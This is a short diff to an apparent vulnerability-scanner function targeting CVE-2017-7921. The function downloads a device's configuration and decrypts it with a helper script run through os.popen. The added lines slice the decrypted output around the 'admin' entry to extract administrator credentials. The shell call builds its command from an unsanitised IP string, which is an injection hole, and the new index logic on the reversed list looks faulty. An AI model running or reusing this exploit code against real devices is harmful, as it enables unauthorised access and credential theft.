@@ -28,6 +28,8 @@ def cve_2017_7921(ip: str) -> list:
             f.write(rc.content)
         info = os.popen(f"python3 scan/lib/decrypt_configure.py {ip}-config").readlines()
         os.remove(f"{ip}-config")
+        idx = info[::-1].index('admin')
+        info = info[idx - 1: ]
         return [True, 'cve-2017-7921', str(info)]
     return [False, 'cve-2017-7921']
 
